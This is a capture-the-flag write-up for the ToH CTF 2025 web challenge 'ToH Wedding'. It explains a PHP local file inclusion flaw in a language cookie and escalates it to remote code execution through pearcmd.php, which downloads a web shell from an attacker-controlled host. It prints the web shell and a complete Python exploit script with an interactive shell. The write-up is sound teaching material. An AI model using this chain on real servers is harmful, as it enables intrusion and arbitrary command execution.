# ToH Wedding<br><small style="color: #888;font-size: 20px;">writeup @ ToH CTF 2025</small>
<span style="background-color: #121212; padding: 4px; border-radius: 3px; margin-right: 2px;">Category: `web`</span> <span style="background-color: #121212; padding: 4px; border-radius: 3px; margin-right: 2px;">Author: [`Ricy`](https://github.com/riccardosarro)</span> <span style="background-color: #121212; padding: 4px; border-radius: 3px;">Solves: `0`</span>
> You have been invited to the wedding of **Io_no** and **MrIndeciso**, our beloved ToH couple and masters of libdebug development. Rejoice and celebrate with us, and don't forget to RSVP!

## Index
1. [TL;DR](#tldr)
2. [Source code](#source-code)
3. [Exploitation](#exploitation)
4. [Exploit script](#exploit-script)

<hr/>

<span id="tldr"></span>

### 1. `TL;DR` 
The challenge is vulnerable to a Local File Inclusion (**LFI**) attack, due to cookies not being sanitized, and an unsafe use of the `include` statement. By exploiting the file `pearcmd.php`, present in the every php server by default, we can download a file from a remote server and then have **RCE**.

<span id="source-code"></span>

## 2. Source code
You find provided a PHP application that handles dummy RSVPs. The flag is stored in the `rsvp_X.csv` file, which is technically accessible to everyone but since `X` is uniformly randomly generated and thus not predictable, hence you cannot access it directly. 

There is something funny with the `lang.php` file:

```php
// lang.php
1:  <?php
2:  session_start();
3:  
4:  if (isset($_GET['lang'])) {
5:    $lang = $_GET['lang'];
6:    // we don't trust the GET parameter, comes from the user
7:    if ($lang != 'en' && $lang != 'it') {
8:      // default if lang is not valid, is italian
9:      $lang = 'it';
10:   }
11:   // Register the session and set the cookie
12:   $_SESSION['lang'] = $lang;
13:   setcookie('lang', $lang, time() + (3600 * 24 * 30));
14: } else if (isset($_SESSION['lang'])) {
15:   $lang = $_SESSION['lang'];
16: } else if (isset($_COOKIE['lang'])) {
17:   // cookie is safe, we set it ourself
18:   $lang = $_COOKIE['lang'];
19: } else {
20:   // default language is browser language
21:   $lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
22:   if ($lang != 'en' && $lang != 'it') {
23:     // default if browser is not valid, is italian
24:     $lang = 'it';
25:   }
26: }
27: 
28: // include the language file
29: include 'lang/' . $lang . '.php';
30: ?>
```

In **lines 4:26** we can see that even though we sanitize the `lang` parameter when coming from the GET request, we do not sanitize it when it comes from the **session** or **cookie**. While we can't control the session in this case, **cookies are controlled by the user**, so we shouldn't trust them.

>Note that if the server already set the session for us, we cannot overwrite it with a cookie, so we need to clear the session first and then set the cookie before sending the request to the server.

Something else that might catch your attention is how we include the language file in **line 29**. The `include` statement is vulnerable to [Local File Inclusion](https://owasp.org/www-community/attacks/Path_Traversal) attacks, which means that we can include any file on the server, as long as we can control the `lang` variable, which in this case is controlled by the user through the cookie.

We are though limited by the extension of the file, which must be `.php`, but we can still include any file in the server that ends with `.php`.

<span id="exploitation"></span>

## 3. Exploitation
As explained in this [guide](https://blog.csdn.net/rfrder/article/details/121042290), PHP by default comes with the `pearcmd.php` file, which is a command line interface for the PEAR package manager. This file is usually located in the `/usr/local/lib/php/` directory, but it can vary depending on the system. And it can be used to execute arbitrary commands if we can execute it and pass it to it arguments.

In PHP, it happens something funny when we pass arguments using the url query string, for example:

```
http://example.com/pearcmd.php?abc+abc
```

This will load the array `["abc", "abc"]` of arguments, which will be passed to the `$_SERVER['argv']` variable.

Thus, we can use this to execute arbitrary commands by including the `pearcmd.php` file and passing it the command we want to execute as an argument.

For instance, a way to do this is to set the `lang` cookie to `../../../../usr/local/lib/php/pearcmd`, this will include the `pearcmd.php` file in the current page, and then we can use query parameters: `/?&+install+-R+/+{webhook_url}/s.php` to inject the `$_SERVER['argv']` variable.

This will execute the `pearcmd.php` file with the `install -R / {webhook_url}/s.php` arguments, which will download the `s.php` file from the webhook URL. 

By default, these files will be saved in the `/tmp/pear/download/` directory, so we can then include it again using the cookie `lang` set to `../../../../tmp/pear/download/s`.

Finally, we need to host the `s.php` file on a server that we control, allowing us to execute arbitrary PHP code on the server. One way to do this is to create a simple PHP web shell in the `s.php` file, for example:

```php
<?php
if (isset($_GET['cmd'])) {
  system($_GET['cmd']);
}
?>
```

This will allow us to execute arbitrary commands on the server by visiting the URL `https://tohwedding.ctf.towerofhanoi.it/?cmd=ls` when the cookie `lang` is set to `../../../../tmp/pear/download/s`.

and thus we can read the flag from the `rsvp_X.csv` file by either executing the command `cat rsvp_*`, or by just leaking the file name with the `ls` command and then accessing it directly with the URL `https://tohwedding.ctf.towerofhanoi.it/rsvp_X.csv`.

Hope you had fun! 😊

<span id="exploit-script"></span>

## 4. Exploit script
```python
import pyngrok.ngrok
import requests
import urllib.parse
import re
from pyngrok import ngrok
from flask import Flask, Response
from threading import Thread

app = Flask(__name__)

import random
def random_hex(length=8):
    """Generate a random hexadecimal string of specified length."""
    return ''.join(random.choice('0123456789abcdef') for _ in range(length))

rndhex = random_hex()

app_path = f"/s{rndhex}.php"

@app.route(app_path)
def revshell():
  php_code = """<?php
  if (isset($_GET['cmd'])) {
      $cmd = $_GET['cmd'];
      echo "<pre>" . shell_exec($cmd) . "</pre>";
  } else {
      echo "No command provided.";
  }
?>"""
  return Response(php_code, mimetype='application/x-httpd-php')


s = requests.Session()
flag_format = "toh{[^}]+}"

# host a s.php file in repourl
ngrok_tunnel = ngrok.connect(5000)
webhook_url = ngrok_tunnel.public_url

# challenge url
baseurl = "http://localhost:8080"
baseurl = "https://tohwedding.ctf.towerofhanoi.it"

def lfi2download():
  url = f"{baseurl}/?&+install+-R+/+{webhook_url}/s{rndhex}.php"
  s.cookies.set("lang", "../../../../usr/local/lib/php/pearcmd")
  r = s.get(url)
  print(r.text)

def trigger_rce(cmd):
  url = f"{baseurl}/?cmd={urllib.parse.quote(cmd)}"
  s.cookies.set("lang", f"../../../../tmp/pear/download/s{rndhex}")
  r = s.get(url)
  text = r.text.split("<!DOCTYPE")[0]
  print(text)
  return text

def interactive_shell():
  while True:
    cmd = input("$> ")
    if cmd.lower() == "exit":
      break
    trigger_rce(cmd)

def get_flag():
  text = trigger_rce("cat rsvp_*")
  print(text)
  flag = re.search(flag_format, text)
  if flag:
    print(flag.group(0))
  else:
    print("[!] No flag found.")

def main():
  lfi2download()
  get_flag()
  interactive_shell()
  

if __name__ == "__main__":
  Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000}, daemon=True).start()
  main()
```
